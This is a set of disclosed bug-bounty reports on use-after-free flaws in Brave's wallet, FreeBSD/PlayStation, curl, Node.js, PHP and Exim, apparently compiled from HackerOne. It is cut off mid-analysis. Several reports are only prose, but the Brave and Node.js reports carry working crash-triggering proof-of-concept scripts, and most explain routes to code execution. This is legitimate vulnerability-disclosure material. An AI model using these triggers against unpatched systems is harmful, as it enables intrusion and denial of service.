- **Report ID:** `1977252`
- **Severity:** Critical
- **Weakness:** Use After Free
- **Program:** Brave Software
- **Reporter:** @nick0ve
- **Bounty:** 3000 usd
- **Disclosed:** 2023-10-11T17:02:49.777Z
- **CVE(s):** -

**Vulnerability Information:**

There is a UAF (Use After Free) vulnerability in the renderer implementation of the Ethereum wallet.

When the Ethereum wallet is connected, every V8 render gets this piece of code installed, creating a new object ethereum accessible from V8. You can find the code here: https://github.com/brave/brave-core/blob/45c6649a124dd8d0ffb19ca6f7047bebb6e6da2c/components/brave_wallet/renderer/js_ethereum_provider.cc#L163-L164

I will highlight some parts of the JSEthereumProvider::Install function that show the bug:

```cpp
// 1. Create a new handle to JSEthereumProvider and convert it to a v8::Object
gin::Handle<JSEthereumProvider> provider =
    gin::CreateHandle(isolate, new JSEthereumProvider(render_frame));
if (provider.IsEmpty()) {
  return;
}
v8::Local<v8::Value> provider_value = provider.ToV8();
v8::Local<v8::Object> provider_object =
    provider_value->ToObject(context).ToLocalChecked();

// 2. Create a v8::Proxy for the provider
if (!v8::Proxy::New(context, provider_object, ethereum_proxy_handler_obj)
         .ToLocal(&ethereum_proxy)) {
  // Error handling
}

// 3. Expose it through window.ethereum
global
    ->Set(context, gin::StringToSymbol(isolate, kEthereum), ethereum_proxy)
    .Check();

// 4. Create a new v8::Object and make it accessible through ethereum._metamask
v8::Local<v8::Object> metamask_obj = v8::Object::New(isolate);
provider_object
    ->Set(context, gin::StringToSymbol(isolate, kMetaMask), metamask_obj)
    .Check();

// 5. [BUG] Set a new property called `IsUnlocked`, creating a new callback object bound to `base::Unretained(provider.get())`, making the wrong assumption that ethereum._metamask can never outlive ethereum
provider_object
    ->Set(context, gin::StringToSymbol(isolate, kIsUnlocked),
          gin::CreateFunctionTemplate(
              isolate, base::BindRepeating(&JSEthereumProvider::IsUnlocked,
                                           base::Unretained(provider.get())))
              ->GetFunction(context)
              .ToLocalChecked())
    .Check();
```
The bug can be triggered through JavaScript with the following steps:

1. Get a reference to ethereum._metamask.
2. Delete the ethereum object, which deletes provider.get().
3. Call isUnlocked(), which will point to the deleted provider.get() pointer.

Here is a PoC (Proof of Concept) that can crash the renderer process:
```
function triggerGC() {
  for (let i = 0; i < 100; i++) {
    let a = new Array(1000000);
  }
}

let uafObj = ethereum._metamask;
delete ethereum;
triggerGC();
console.log(await uafObj.isUnlocked());
```

Will try to follow up with a full exploit to show code execution on the renderer process.

## Impact

Get code execution on the renderer process.

---

### [Use-after-free in setsockopt IPV6_2292PKTOPTIONS (CVE-2020-7457)](https://hackerone.com/reports/1441103)

- **Report ID:** `1441103`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** PlayStation
- **Reporter:** @theflow0
- **Bounty:** 10000 usd
- **Disclosed:** 2022-09-20T21:16:05.057Z
- **CVE(s):** CVE-2020-7457

**Summary (team):**

The PS5 is vulnerable to https://hackerone.com/reports/826026 which easily grants kernel access to an attacker. This vulnerability had been reported by me for the PS4 2 years ago when the PS5 did not yet exist, thus this should be considered as a new report and **not a duplicate**.

I was able to use this vulnerability in conjunction with the bd-j exploit chain to gain kernel access.

See https://www.freebsd.org/security/advisories/FreeBSD-SA-20:20.ipv6.asc for more details.

## Impact

Gain kernel access on PS5.

---

### [CVE-2021-22901: TLS session caching disaster](https://hackerone.com/reports/1180380)

- **Report ID:** `1180380`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** curl
- **Reporter:** @nyymi
- **Bounty:** - usd
- **Disclosed:** 2021-05-26T08:24:20.205Z
- **CVE(s):** CVE-2021-22901

**Vulnerability Information:**

## Summary:
lib/vtls/openssl.c `ossl_connect_step1` sets up the `ossl_new_session_cb` sessionid callback with  `SSL_CTX_sess_set_new_cb`, and adds association from `data_idx` and `connectdata_idx` to current `conn` and `data` respectively:
```
  SSL_CTX_set_session_cache_mode(backend->ctx,
      SSL_SESS_CACHE_CLIENT | SSL_SESS_CACHE_NO_INTERNAL);
  SSL_CTX_sess_set_new_cb(backend->ctx, ossl_new_session_cb);
```
...
```
      SSL_set_ex_data(backend->handle, data_idx, data);
      SSL_set_ex_data(backend->handle, connectdata_idx, conn);
```
 
Whenever the `ossl_new_session_cb` callback is called the code fetches the `conn` and `data` associated  via:
``` 
  conn = (struct connectdata*) SSL_get_ex_data(ssl, connectdata_idx);
  if(!conn)
    return 0;

  data = (struct Curl_easy *) SSL_get_ex_data(ssl, data_idx);
```
However, it is possible that the connection is disassociated from these pointers via `Curl_detach_connnection`, and reassociated to a different connection via `Curl_attach_connnection`. Yet, `Curl_detach_connnection` doesn't `SSL_set_ex_data` the `data_idx` / `connectdata_idx`/ to NULL, nor does `Curl_attach_connnection` update the pointers with new ones. I am not absolutely certain but this appears to lead to a situation where a stale pointer(s) can exists when the session callback is called. 

## Steps To Reproduce:

Unfortunately I currently have no easy to way reproduce this issue. I might attempt to do this later.

## Notes

This issue is currently lacking information but includes what I believe is the potential root cause of the issue. This information might be wrong or lacking necessary details to make full determination of the validity of this issue at this time.

This issue seems to be occurring somewhat periodically when webkit browser is built with the libcurl backend. Typically this is a rare use case, I know of only Sony Playstation devices that use in larger scale.

## Impact

Use after free, with potential for (remote(*)) code execution as `ossl_new_session_cb` calls `Curl_ssl_sessionid_lock(data);` with potentially repurposed memory. Attacker would need to control `data->share` pointer to attacker controller memory. This fake `struct Curl_share` would need to be crafted in a way that `if(share->specifier & (1<<type))` is taken. `share->lockfunc` would then get called by the function, resulting in code execution.

*) caveat here, as it is unknown if external attacker can trigger this situation. It would be difficult, but cannot be completely ruled out.

---

### [Node.js: use-after-free in TLSWrap](https://hackerone.com/reports/988103)

- **Report ID:** `988103`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** Node.js
- **Reporter:** @fwilhelm
- **Bounty:** - usd
- **Disclosed:** 2021-01-05T08:18:06.740Z
- **CVE(s):** CVE-2020-8265

**Vulnerability Information:**

Node.js: use-after-free in TLSWrap

Node v14.11.0 (Current) is vulnerable to a use-after-free bug in its TLS implementation.
When writing to a TLS enabled socket, node::StreamBase::Write calls node::TLSWrap::DoWrite
with a freshly allocated WriteWrap object as first argument. If the DoWrite method
does not return an error, this object is passed back to the caller as part of a 
StreamWriteResult structure:
  // stream_base-inl.h
  WriteWrap* req_wrap = CreateWriteWrap(req_wrap_obj);

  err = DoWrite(req_wrap, bufs, count, send_handle);
  bool async = err == 0;

  if (!async) {
    req_wrap->Dispose();
    req_wrap = nullptr;
  }

  const char* msg = Error();
  if (msg != nullptr) {
    req_wrap_obj->Set(env->context(),
                      env->error_string(),
                      OneByteString(env->isolate(), msg)).Check();
    ClearError();
  }

  return StreamWriteResult { async, err, req_wrap, total_bytes };

The problem is that TLSWrap::DoWrite can trigger a free of the WriteWrap object 
without returning an error when the EncOut() call at the end of the DoWrite method fails.
EncOut() calls underlying_stream()->Write() to write TLS encrypted data to the network socket.
If this write fails, InvokeQueued() is called and the function returns immediately:

  // tls_wrap.cc
  // Write any encrypted/handshake output that may be ready.
  // Guard against sync call of current_write_->Done(), its unsupported.
  in_dowrite_ = true;
  EncOut();
  in_dowrite_ = false;

  return 0;

  // tls_wrap.cc
  void TLSWrap::EncOut() {
  [...]

  Debug(this, "Writing %zu buffers to the underlying stream", count);
  StreamWriteResult res = underlying_stream()->Write(bufs, count);
  if (res.err != 0) {
    InvokeQueued(res.err);
    return;
  }
  [..]

InvokeQueued() triggers an immediate free of the req_wrap WriteWrap* object via the
following call chain: 
node::TLSWrap::InvokeQueued -> node::StreamReq::Done -> node::WriteWrap::OnDone
-> node::StreamReq::Dispose -> node::BaseObjectPtrImpl<node::AsyncWrap, false>::~BaseObjectPtrImpl()
-> node::BaseObject::decrease_refcount() -> node::SimpleWriteWrap<node::AsyncWrap>::~SimpleWriteWrap()

Making underlying_stream()->Write fail is as easy as closing the socket at the other side 
of the connection just before the write to trigger a broken pipe error. 

Because node::TLSWrap::DoWrite doesn't return an error code, node::StreamBase::Write will return 
the freed WriteWrap object as part of its StreamWriteResult. For calls by node::StreamBase::WriteV, 
this will immediately trigger a use-after-free when the SetAllocatedStorage() method 
is called on the freed object:

  // stream_base.cc
  StreamWriteResult res = Write(*bufs, count, nullptr, req_wrap_obj);
  SetWriteResult(res);
  if (res.wrap != nullptr && storage_size > 0) {
    res.wrap->SetAllocatedStorage(std::move(storage));
  }

The bug can be easily triggered against a simple node HTTPS server application. Under normal 
circumstances and without an ASAN enabled build, the UAF doesn't trigger a crash on Linux 
as the freed memory  won't get reallocated in time and the write in SetAllocatedStorage 
corrupts chunk metadata  that isn't used for small chunks. 
I think this is the only reason why the bug wasn't spotted earlier, as the broken pipe error path should be hit 
pretty often in the real world. However, this issue might still be exploitable with the right heap layout 
(if the WriteWrap chunk is merged with a larger chunk during the free), different heap implementations 
and/or some other control flow that allows to allocate something before the reuse. 

Proof-of-Concept:

server.js:
```
const https = require('https');

const key = `-----BEGIN EC PARAMETERS-----
BggqhkjOPQMBBw==
-----END EC PARAMETERS-----
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIDKfHHbiJMdu2STyHL11fWC7psMY19/gUNpsUpkwgGACoAoGCCqGSM49
AwEHoUQDQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81
PWBiTdSZrGBGQSy+UAlQvYeE6Z/QXQk8aw==
-----END EC PRIVATE KEY-----`

const cert = `-----BEGIN CERTIFICATE-----
MIIBhjCCASsCFDJU1tCo88NYU//pE+DQKO9hUDsFMAoGCCqGSM49BAMCMEUxCzAJ
BgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwOTIyMDg1NDU5WhcNNDgwMjA3MDg1NDU5
WjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwY
SW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcD
QgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81PWBiTdSZ
rGBGQSy+UAlQvYeE6Z/QXQk8azAKBggqhkjOPQQDAgNJADBGAiEA7Bdn4F87KqIe
Y/ABy/XIXXpFUb2nyv3zV7POQi2lPcECIQC3UWLmfiedpiIKsf9YRIyO0uEood7+
glj2R1NNr1X68w==
-----END CERTIFICATE-----`

const options = {
  key: key,
  cert: cert,
};

https.createServer(options, function (req, res) {
  res.writeHead(200);
  res.end("hello world\n");
}).listen(4444);
```
---

poc.js:
```
const tls = require('tls')

var socket = tls.connect(4444, 'localhost', {rejectUnauthorized : false}, () => {
  console.log("connected")
  socket.write("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-alive\r\n\r\n")
  socket.write("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-alive\r\n\r\n")
  socket.write("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-alive\r\n\r\n")
})


socket.on('data', () => {
  socket.destroy()
})  
```





The POC triggers a crash when server.js is run on an ASAN enabled build of node.js: 
```
==1408671==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000011138 at pc 0x0000011929b6 bp 0x7ffc8c2243f0 sp 0x7ffc8c2243e8
READ of size 8 at 0x608000011138 thread T0
    #0 0x11929b5 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42
    #1 0x1192974 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::get() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:361:21
    #2 0x1193fb4 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::operator bool() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:375:16
    #3 0x1190415 in node::AllocatedBuffer::data() /pwd/out/../src/allocated_buffer-inl.h:79:8
    #4 0x16f8a79 in node::WriteWrap::SetAllocatedStorage(node::AllocatedBuffer&&) /pwd/out/../src/stream_base-inl.h:247:3
    #5 0x16f1141 in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:172:15
    #6 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29
    #7 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3
    #8 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36
    #9 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5
    #10 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1
    #11 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)

0x608000011138 is located 24 bytes inside of 88-byte region [0x608000011120,0x608000011178)
freed by thread T0 here:
    #0 0xe79b1d in operator delete(void*) (/p0/node/node-v14.11.0/out/Debug/node+0xe79b1d)
    #1 0x1707177 in node::SimpleWriteWrap<node::AsyncWrap>::~SimpleWriteWrap() /pwd/out/../src/stream_base.h:418:7
    #2 0xf943be in node::BaseObject::decrease_refcount() /pwd/out/../src/base_object-inl.h:203:7
    #3 0x10886e6 in node::BaseObjectPtrImpl<node::AsyncWrap, false>::~BaseObjectPtrImpl() /pwd/out/../src/base_object-inl.h:248:12
    #4 0x13c2a3c in node::StreamReq::Dispose() /pwd/out/../src/stream_base-inl.h:40:1
    #5 0x16f794c in node::WriteWrap::OnDone(int) /pwd/out/../src/stream_base.cc:591:3
    #6 0x10e71f8 in node::StreamReq::Done(int, char const*) /pwd/out/../src/stream_base-inl.h:261:3
    #7 0x1921f95 in node::TLSWrap::InvokeQueued(int, char const*) /pwd/out/../src/tls_wrap.cc:101:8
    #8 0x1927f39 in node::TLSWrap::EncOut() /pwd/out/../src/tls_wrap.cc:356:5
    #9 0x192e258 in node::TLSWrap::DoWrite(node::WriteWrap*, uv_buf_t*, unsigned long, uv_stream_s*) /pwd/out/../src/tls_wrap.cc:820:3
    #10 0x13b50dd in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local<v8::Object>) /pwd/out/../src/stream_base-inl.h:193:9
    #11 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:169:27
    #12 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29
    #13 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3
    #14 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36
    #15 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5
    #16 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1
    #17 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)
 
previously allocated by thread T0 here:
    #0 0xe792bd in operator new(unsigned long) (/p0/node/node-v14.11.0/out/Debug/node+0xe792bd)
    #1 0x16f81c2 in node::StreamBase::CreateWriteWrap(v8::Local<v8::Object>) /pwd/out/../src/stream_base.cc:629:10
    #2 0x13b4fb0 in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local<v8::Object>) /pwd/out/../src/stream_base-inl.h:191:25
    #3 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:169:27
    #4 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29
    #5 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3
    #6 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36
    #7 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5
    #8 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1
    #9 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)
    #10 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)
    #11 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)
   

SUMMARY: AddressSanitizer: heap-use-after-free /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const
Shadow bytes around the buggy address:
  0x0c107fffa1d0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fffa1e0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fffa1f0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fffa200: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa
  0x0c107fffa210: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c107fffa220: fa fa fa fa fd fd fd[fd]fd fd fd fd fd fd fd fa
  0x0c107fffa230: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fffa240: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fffa250: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fffa260: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fffa270: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1408671==ABORTING
```

Credits: 
Felix Wilhelm of Google Project Zero

This bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report 
will become visible to the public. The scheduled disclosure date is 2020-12-21. 
Disclosure at an earlier date is also possible if agreed upon by all parties.

## Impact

Remote code execution

---

### [Use after free and out of bounds read in xmlrpc_decode()](https://hackerone.com/reports/477896)

- **Report ID:** `477896`
- **Severity:** Critical
- **Weakness:** Use After Free
- **Program:** Internet Bug Bounty
- **Reporter:** @hanno
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:48:05.244Z
- **CVE(s):** CVE-2019-9020

**Vulnerability Information:**

Malformed input can lead to use after free and out of bounds memory errors.

This has been fixed with the latest updates of PHP (7.1.26/7.2.14/7.3.1).

(Note: I reported those as separate bugs to PHP, but they had the same underlying bug and were fixed by the same commit. The release notes only mention "out of bounds read", but this is misleading, as a use after free error is potentially more severe.)

Bugs reported to PHP:
https://bugs.php.net/bug.php?id=77242
https://bugs.php.net/bug.php?id=77249

## Impact

If the xmlrpc functionality of PHP is used to parse untrusted input from a public API point it can potentially be used to gain code execution.

---

### [efree() on uninitialized Heap data in imagescale leads to use-after-free](https://hackerone.com/reports/478367)

- **Report ID:** `478367`
- **Severity:** Critical
- **Weakness:** Use After Free
- **Program:** Internet Bug Bounty
- **Reporter:** @simonscannell
- **Bounty:** 1500 usd
- **Disclosed:** 2020-10-10T08:14:32.198Z
- **CVE(s):** CVE-2016-10166

**Vulnerability Information:**

The core bug: https://bugs.php.net/bug.php?id=77269

This bugfix actually involves two vulnerabilities: a call to efree on uninitialized data and another free()  based vulnerability. What is described below is a bug that was fixed in libgd two years ago (CVE-2016-10166), but the patch was never applied to PHP's libgd. Furthermore, the patch for that CVE introduced a use after free vulnerability, also in PHPs `imagescale()` function. This can be seen in the comment history of the PHP bug.

----
The bug occurs in ext/gd/libgd/gd_interpolation.c in the function _gdContributionsAlloc(int line_size, int windows_size). The function will attempt to allocate helper structs and receives two parameters: the line size and the windows size. To prevent integer overflows, each parameter is passed to gd's overflow2() function before being used in the gdMalloc function.
(gdMalloc is just #define gdMalloc emalloc).

However, if the overflow2 check for windows size is positive, overflow_error is set to true, which leads to gd attempting to free all the lines allocated so far. The issue is that gd does not check if any lines have been allocated so far at all. By supplying input that leads to overflow2 being true, .Weights is freed, which is an unintialized pointer. 

```
if (overflow2(line_length, sizeof(ContributionType))) {
		gdFree(res);
		return NULL;
	}
	res->ContribRow = (ContributionType *) gdMalloc(line_length * sizeof(ContributionType));
	if (res->ContribRow == NULL) {
		gdFree(res);
		return NULL;
	}
	for (u = 0 ; u < line_length ; u++) {
		if (overflow2(windows_size, sizeof(double))) {
			overflow_error = 1;
		} else {
			res->ContribRow[u].Weights = (double *) gdMalloc(windows_size * sizeof(double));
		}
		if (overflow_error == 1 || res->ContribRow[u].Weights == NULL) {
			unsigned int i;
			u--;
			for (i=0;i<=u;i++) {
                gdFree(res->ContribRow[i].Weights);
			}
```

When the for loop is reached that frees the uninitialized pointers, i will be 0 and u too. However, before the for loop is entered u is decremented by one so it will turn into -1 , which leads to the condition i <=0 never being met.

## Impact

This vulnerability can be used to write a local safe mode bypass and can potentially be exploited remotely.

---

### [Use-After-Free In IPV6_2292PKTOPTIONS leading To Arbitrary Kernel R/W Primitives](https://hackerone.com/reports/826026)

- **Report ID:** `826026`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** PlayStation
- **Reporter:** @theflow0
- **Bounty:** 10000 usd
- **Disclosed:** 2020-07-06T19:12:54.099Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

Due to missing locks in option `IPV6_2292PKTOPTIONS` of `setsockopt` , it is possible to race and free the `struct ip6_pktopts ` buffer, while it is being handled by `ip6_setpktopt`. This structure contains pointers (`ip6po_pktinfo`) that can be hijacked to obtain arbitrary kernel R/W primitives. As a consequence, it is easy to have kernel code execution. This vulnerability is reachable from WebKit sandbox and is available in the latest FW, that is 7.02.

## Attachment

Attached is a Proof-Of-Concept that achieves a Local Privilege Escalation on FreeBSD 9 and FreeBSD 12.

## Impact

- In conjunction with a WebKit exploit, a fully chained remote attack can be achieved.
- It is possible to steal/manipulate user data.
- Dump and run pirated games.

---

### [Exim use-after-free vulnerability while reading mail header involving BDAT commands](https://hackerone.com/reports/296991)

- **Report ID:** `296991`
- **Severity:** Critical
- **Weakness:** Use After Free
- **Program:** Internet Bug Bounty
- **Reporter:** @mehqq
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T23:45:11.583Z
- **CVE(s):** CVE-2017-16943

**Vulnerability Information:**

Original article is [here](https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/)

# Use-after-free in receive_msg leads to RCE

### Vulnerability Analysis
To explain this bug, we need to start with the memory management of exim. There is a series of functions starts with `store_` such as `store_get`, `store_release`, `store_reset`. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:
![architecture of storeblock](https://d2mxuefqeaa7sj.cloudfront.net/s_250CBD95095D0019FAC82FED4F605A7EFB015920E271206EB018526E9DD7E3F0_1510286247190_exim+store+1.png)

Initially, exim allocates a big storeblock (default 0x2000) and then cut it into **stores** when `store_get` is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the `current_block` is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes `current_block` point to it. Exim maintains three `store_pool`, that is, there are three chains like the illustration above and every global variables are actually arrays.
This vulnerability is in `receive_msg` where exim reads headers: 
[receive.c: 1817 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817)
```c
  if (ptr >= header_size - 4)
    {
    int oldsize = header_size;
    /* header_size += 256; */
    header_size *= 2;
    if (!store_extend(next->text, oldsize, header_size))
      {
      uschar *newtext = store_get(header_size);
      memcpy(newtext, next->text, ptr);
      store_release(next->text);
      next->text = newtext;
      }
    }
```
It seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to **extend** store, the function `store_extend` checks whether the old store is the latest store allocated in `current_block`. It returns False immediately if the check is failed.
[store.c: 276 store_extend](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276)
```c
if (CS ptr + rounded_oldsize != CS (next_yield[store_pool]) ||
    inc > yield_length[store_pool] + rounded_oldsize - oldsize)
  return FALSE;
```
Once `store_extend` fails, exim tries to get a new store and release the old one. After we look into  `store_get` and store_release, we found that `store_get` returns a **store**, but `store_release` releases a **block** if the store is at the head of it. That is to say, if `next->text` points to the start the `current_block` and `store_get` cuts store inside it for `newtext`, then `store_release(next->text)` frees `next->text`, which is equal to `current_block`, and leaves `newtext` and `current_block` pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call `store_get` after `next->text` is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes `store_get` reachable and finally leads to an RCE.
Exim uses [function pointers](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136) to switch between different input sources, such as `receive_getc`, `receive_getbuf`. When receiving BDAT data, `receive_getc` is set to `bdat_getc` in order to check left chunking data size and to handle following command of BDAT. In `receive_msg`, exim also uses `receive_getc`. It loops to read data, and stores data into `next->text`, extends if insufficient.
[receive.c: 1817 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789)
```c
for (;;)
  {
  int ch = (receive_getc)(GETC_BUFFER_UNLIMITED);
  
  /* If we hit EOF on a SMTP connection, it's an error, since incoming
  SMTP must have a correct "." terminator. */

  if (ch == EOF && smtp_input /* && !smtp_batched_input */)
    {
    smtp_reply = handle_lost_connection(US" (header)");
    smtp_yield = FALSE;
    goto TIDYUP;                       /* Skip to end of function */
    }
```
In `bdat_getc`, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. 
[smtp_in.c: 628 bdat_getc](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628)
```c
    case BDAT_CMD:
      {
      int n;

      if (sscanf(CS smtp_cmd_data, "%u %n", &chunking_datasize, &n) < 1)
	{
	(void) synprot_error(L_smtp_protocol_error, 501, NULL,
	  US"missing size for BDAT command");
	return ERR;
	}
```
In exim, it usually calls `synprot_error` to raise error message, which also logs at the same time.
[smtp_in.c: 628 bdat_getc](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984)
```c
static int
synprot_error(int type, int code, uschar *data, uschar *errmess)
{
int yield = -1;

log_write(type, LOG_MAIN, "SMTP %s error in \"%s\" %s %s",
  (type == L_smtp_syntax_error)? "syntax" : "protocol",
  string_printing(smtp_cmd_buffer), host_and_ident(TRUE), errmess);
```
The log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as `'\n'->'\\n'`. Therefore, it asks `store_get` for memory to store strings.
